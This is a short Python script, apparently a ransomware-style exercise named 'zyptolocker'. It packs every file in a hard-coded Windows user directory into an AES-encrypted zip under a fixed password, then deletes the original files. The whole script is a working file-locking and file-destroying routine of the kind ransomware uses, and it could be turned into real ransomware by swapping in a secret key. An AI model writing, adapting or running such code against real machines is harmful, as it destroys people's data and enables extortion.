import os
import chilkat
import sys


def remove_file():
    for subdir, dirs, files in os.walk(os.getcwd()):
        for file in files:
            if file != "zyptolocker.zip":
                os.remove(file)


def start_zip(password, directory):
    os.chdir(directory)
    zip = chilkat.CkZip()

    success = zip.UnlockComponent("Anything for 30-day trial")
    if not success:
        print(zip.lastErrorText())
        sys.exit()

    success = zip.NewZip("zyptolocker.zip")
    if not success:
        print(zip.lastErrorText())
        sys.exit()

    zip.put_Encryption(4)
    zip.put_EncryptKeyLength(128)
    zip.put_EncryptPassword(password)
    recurse = True
    success = zip.AppendFiles(directory + r'\*', recurse)
    if not success:
        print(zip.lastErrorText())
        sys.exit()

    success = zip.WriteZipAndClose()
    if not success:
        print(zip.lastErrorText())
        sys.exit()

    print("Zip Created!")
    remove_file()


def main():
    directory = r'C:\Users\ahirsch\PycharmProjects\vulnerability_checking\desktop'
    password = 'password'
    start_zip(password, directory)


main()
